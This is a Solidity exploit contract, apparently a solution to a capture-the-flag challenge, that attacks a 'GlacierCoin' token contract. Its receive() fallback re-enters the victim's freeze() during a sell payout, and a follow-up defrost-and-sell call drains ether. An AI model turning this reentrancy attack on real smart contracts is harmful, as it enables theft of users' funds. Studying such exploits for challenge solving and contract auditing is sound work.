// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {GlacierCoin} from "./GlacierCoin.sol";

contract GlacierCoinExploit {
    GlacierCoin public immutable _victimContract;

    constructor(address victimAddress) {
        _victimContract = GlacierCoin(victimAddress);
    }

    function attack() public payable {
        require(msg.value == 10 ether);
        _victimContract.buy{value: 10 ether}();

        // console.log("Sent Ether", _victimContract.balances(address(this)));
        _victimContract.sell(10 ether);
    }

    function exploit_again() public payable {
        _victimContract.defrost(10 ether);
        // console.log(
        //     "Checking balance 2",
        //     _victimContract.balances(address(this))
        // );
        // console.log("Frozen guy 2", _victimContract.frozen(address(this)));
        _victimContract.sell(10 ether);
        // console.log("My balance 2", address(this).balance);
    }

    receive() external payable {
        _victimContract.freeze(10 ether);
        // console.log("Checking balance", address(_victimContract).balance);
        // console.log("My balance", address(this).balance);
        // console.log("Reentrancy");
        // console.log(
        //     "Balance in contract after",
        //     _victimContract.balances(address(this))
        // );
        // console.log("Frozen guy", _victimContract.frozen(address(this)));
    }
}
